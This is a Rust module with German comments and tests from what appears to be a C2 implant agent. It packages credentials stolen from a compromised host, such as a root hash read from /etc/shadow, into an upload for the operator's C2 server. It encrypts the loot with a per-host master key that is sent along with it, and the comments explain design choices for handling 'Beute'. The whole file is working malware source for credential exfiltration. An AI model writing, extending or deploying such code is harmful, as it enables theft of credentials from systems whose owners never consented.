//! Das Beutestück eines Hosts — die Form, in der es den Agenten verlässt.
//!
//! Vorher hat jeder Aufrufer die Versiegelung selbst zusammengesetzt: der
//! Master-Key herangezogen, das Passwort verschlüsselt, zwei Felder des
//! Uploads gefüllt. Das stand an sechs Stellen im Agenten, und die Regel
//! „versiegelt schlägt Klartext" stand nirgends, wo sie hingehört — sie
//! stand im Server, wo sie stillschweigend angewandt wurde.
//!
//! Dieses Modul entscheidet. Es kann nicht beide Felder füllen, und es
//! entscheidet auch nicht, was bei einem Verschlüsselungsfehler passiert:
//! ein Fehler ist ein Fehler, kein Grund, den Klartext zu schicken.
//!
//! Der Typ `ExfiltratedSecret` ist dabei einem Typ mit gleichem Namen im
//! Wire-Vertrag gewichen: `kx_core::c2::ExfiltratedSecret` ist das, was der
//! Operator liest — ein **übertragenes** Stück. Das hier ist das Stück, das
//! den Agenten noch verlässt; es stand unter demselben Namen und behauptete
//! damit einen Zustand, den es noch nicht hat.

use crate::c2;
use crate::secret::Secret;
use crate::secretbox;

/// Die Länge eines Master-Keys in Byte.
const MASTER_KEY_LEN: usize = 32;

/// Der Upload, den der C2-Server für dieses Stück bekommt.
///
/// Mit Master-Key steht das versiegelte Passwort im Feld `sealed_password`,
/// und `password` bleibt leer. Ohne Master-Key steht das Passwort im
/// Klartext im Feld `password`, und `sealed_password` bleibt leer.
///
/// Schlägt die Versiegelung fehl, ist das ein Fehler — der Klartext geht
/// dann **nicht** als Ersatz raus. Das Stück bleibt beim Agenten.
///
/// `master_key` gehört zum Host, von dem das Stück stammt: die Beute eines
/// Hosts lässt sich nur mit dem Schlüssel dieses Hosts lesen. `host_id` sagt,
/// welcher Host das ist.
pub fn upload(
    secret: &Secret,
    master_key: Option<&[u8]>,
    sealed_master: Option<&str>,
    host_id: &str,
) -> Result<c2::SecretUpload, String> {
    let upload = c2::SecretUpload {
        host_id: host_id.to_string(),
        cred_type: secret.secret_type.clone(),
        username: secret.target.clone(),
        password: String::new(),
        source: Some(secret.source.clone()),
        master_key: None,
        sealed_password: None,
        // Der Schluessel reist mit der Beute — siehe das Feld in `c2.rs`.
        sealed_master: sealed_master.map(|s| s.to_string()),
    };
    match master_key {
        Some(key) => {
            // Die Länge wird hier geprueft, weil die AEAD-Bibliothek bei
            // falscher Laenge panict statt einen Fehler zu liefern. Ein
            // Panic im Agenten waere schlimmer als ein verschwiegenes
            // Stueck Beute.
            if key.len() != MASTER_KEY_LEN {
                return Err(format!(
                    "Master-Key hat {} Byte, erwartet {MASTER_KEY_LEN}",
                    key.len()
                ));
            }
            let versiegelt = secretbox::seal(key, secret.value.as_bytes())
                .map_err(|e| format!("Passwort nicht versiegelbar: {e}"))?;
            Ok(upload.mit_versiegeltem_passwort(Some(versiegelt)))
        }
        None => Ok(upload.mit_passwort(&secret.value)),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn secret() -> Secret {
        Secret::new("shadow", "root", "hash-wert", "/etc/shadow")
    }

    #[test]
    fn mit_master_key_ist_das_passwort_versiegelt_und_der_klartext_leer() {
        let key = [7u8; 32];
        let upload = upload(&secret(), Some(&key), None, "host-1")
            .expect("die Versiegelung darf nicht scheitern");

        assert!(upload.password.is_empty(), "der Klartext steht im Upload");
        assert!(upload.sealed_password.is_some(), "das Feld ist leer");
        assert_eq!(upload.cred_type, "shadow");
        assert_eq!(upload.username, "root");
        assert_eq!(upload.source.as_deref(), Some("/etc/shadow"));
    }

    #[test]
    fn ohne_master_key_bleibt_der_klartext_und_ist_nicht_versiegelt() {
        let upload = upload(&secret(), None, None, "host-1")
            .expect("ohne Schluessel gibt es nichts zu versiegeln");

        assert_eq!(upload.password, "hash-wert");
        assert!(upload.sealed_password.is_none());
    }

    #[test]
    fn beide_felder_koennen_nicht_gleichzeitig_gefuellt_sein() {
        let key = [7u8; 32];
        for upload in [
            upload(&secret(), Some(&key), None, "host-1").expect("Versiegelung"),
            upload(&secret(), None, None, "host-1").expect("Klartext"),
        ] {
            assert!(
                upload.password.is_empty() || upload.sealed_password.is_none(),
                "beide Felder sind gefuellt"
            );
        }
    }

    #[test]
    fn der_versiegelte_wert_laesst_sich_mit_demselben_schluessel_oeffnen() {
        let key = [7u8; 32];
        let upload = upload(&secret(), Some(&key), None, "host-1")
            .expect("die Versiegelung darf nicht scheitern");

        let versiegelt = upload
            .sealed_password
            .as_deref()
            .expect("das Feld ist gefuellt");
        let offen = secretbox::open(&key, versiegelt).expect("entschluesseln");
        assert_eq!(offen, "hash-wert");
    }

    #[test]
    fn eine_falsche_schluessellaenge_ist_ein_fehler_und_kein_klartext() {
        let upload = upload(&secret(), Some(&[1u8; 4]), None, "host-1");
        assert!(upload.is_err(), "ein zu kurzer Schluessel muss scheitern");
    }

    /// Der Upload traegt die Kennung des Hosts, bei dem das Stueck erbeutet
    /// wurde. Sie wird nicht aus der IP abgeleitet — sie kommt hier herein.
    #[test]
    fn der_upload_traegt_die_host_kennung() {
        let upload = upload(&secret(), None, None, "192.168.1.5").expect("Upload");
        assert_eq!(upload.host_id, "192.168.1.5");
    }
}
